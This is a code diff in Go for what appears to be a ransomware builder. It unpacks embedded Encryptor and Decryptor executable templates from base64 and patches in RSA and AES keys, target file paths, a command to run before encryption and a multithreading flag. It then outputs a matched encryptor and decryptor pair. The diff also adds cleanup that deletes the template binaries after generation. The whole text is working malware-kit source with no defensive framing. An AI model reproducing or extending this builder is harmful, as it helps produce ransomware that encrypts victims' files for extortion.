@@ -3,12 +3,13 @@ package main
 import (
 	"encoding/base64"
 	"fmt"
+	"os"
 	"strconv"
 )
 
 var FILE_RANDSTRING string
 
-func init_exe() error {
+func init_model() error {
 	if !isPathExists("./Encryptor.exe") {
 		ENCRYPTOR_MODEL, err := base64.StdEncoding.DecodeString(ENCRYPTOR_BASE64_MODEL)
 		if err != nil {
@@ -28,8 +29,14 @@ func init_exe() error {
 	return nil
 }
 
+func del_model() error {
+	os.Remove("./Decryptor.exe")
+	os.Remove("./Encryptor.exe")
+	return nil
+}
+
 func generate(path_slice []string, aes_min int, cmd string, is_multi_thread bool) (string, string, error) {
-	err := init_exe()
+	err := init_model()
 	if err != nil {
 		return "", "", err
 	}
@@ -58,6 +65,7 @@ func generate(path_slice []string, aes_min int, cmd string, is_multi_thread bool
 	if err != nil {
 		return "", "", err
 	}
+	del_model()
 	return encryptorFilePath, decryptorFilePath, nil
 }
 
@@ -72,32 +80,32 @@ func generateEncryptor(publicKey string, aesKey string, path_slice []string, cmd
 	if err != nil {
 		return "", err
 	}
-	ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_PUBKEY, []byte(publicKey))
+	ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_PUBKEY, str_decode2byte(publicKey))
 	//修改 Encryptor 的 AES 密钥
 	Symbol_Encryptor_AESKEY, err := findSymbol("./Encryptor.exe", "AESKEY")
 	if err != nil {
 		return "", err
 	}
-	ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_AESKEY, []byte(aesKey))
+	ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_AESKEY, str_decode2byte(aesKey))
 	//修改 Encryptor 的 CMD
 	Symbol_Encryptor_CMD, err := findSymbol("./Encryptor.exe", "COMMAND_BEFORE_START")
 	if err != nil {
 		return "", err
 	}
-	ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_CMD, []byte(cmd))
+	ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_CMD, str_decode2byte(cmd))
 	//修改 Encryptor 的 ASMETRI_MAX
 	Symbol_Encryptor_ASMETRI_MAX, err := findSymbol("./Encryptor.exe", "ASMETRI_MAX")
 	if err != nil {
 		return "", err
 	}
-	ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_ASMETRI_MAX, []byte(strconv.Itoa(aes_min*1024)))
+	ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_ASMETRI_MAX, str_decode2byte(strconv.Itoa(aes_min*1024)))
 	//修改是否多线程
 	if is_multi_thread {
 		Symbol_Encryptor_IS_MULTI_THREAD, err := findSymbol("./Encryptor.exe", "IS_MULTI_THREAD")
 		if err != nil {
 			return "", nil
 		}
-		ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_IS_MULTI_THREAD, []byte("true"))
+		ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_IS_MULTI_THREAD, str_decode2byte("true"))
 	}
 	//修改 Encryptor 的 PATHS
 	Symbol_Encryptor_PATHS, err := findSymbol("./Encryptor.exe", "PATHS")
@@ -106,7 +114,7 @@ func generateEncryptor(publicKey string, aesKey string, path_slice []string, cmd
 	}
 	Symbol_Encryptor_PATHS += 2048
 	for _, path := range path_slice {
-		ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_PATHS, []byte(path))
+		ENCRYPTOR_GENERATED = modifyData(ENCRYPTOR_GENERATED, Symbol_Encryptor_PATHS, str_decode2byte(path))
 		Symbol_Encryptor_PATHS += 2048
 	}
 	//生成文件名称，保存文件
@@ -127,13 +135,13 @@ func generateDecryptor(privateKey string, aesKey string, path_slice []string) (s
 	if err != nil {
 		return "", err
 	}
-	DECRYPTOR_GENERATED = modifyData(DECRYPTOR_GENERATED, Symbol_Decryptor_PRIKEY, []byte(privateKey))
+	DECRYPTOR_GENERATED = modifyData(DECRYPTOR_GENERATED, Symbol_Decryptor_PRIKEY, str_decode2byte(privateKey))
 	//修改 Decryptor 的 AES 密钥
 	Symbol_Decryptor_AESKEY, err := findSymbol("./Decryptor.exe", "AESKEY")
 	if err != nil {
 		return "", err
 	}
-	DECRYPTOR_GENERATED = modifyData(DECRYPTOR_GENERATED, Symbol_Decryptor_AESKEY, []byte(aesKey))
+	DECRYPTOR_GENERATED = modifyData(DECRYPTOR_GENERATED, Symbol_Decryptor_AESKEY, str_decode2byte(aesKey))
 	//修改 Decryptor 的 PATHS
 	Symbol_Decryptor_PATHS, err := findSymbol("./Decryptor.exe", "PATHS")
 	if err != nil {
@@ -141,7 +149,7 @@ func generateDecryptor(privateKey string, aesKey string, path_slice []string) (s
 	}
 	Symbol_Decryptor_PATHS += 2048
 	for _, path := range path_slice {
-		DECRYPTOR_GENERATED = modifyData(DECRYPTOR_GENERATED, Symbol_Decryptor_PATHS, []byte(path))
+		DECRYPTOR_GENERATED = modifyData(DECRYPTOR_GENERATED, Symbol_Decryptor_PATHS, str_decode2byte(path))
 		Symbol_Decryptor_PATHS += 2048
 	}
 
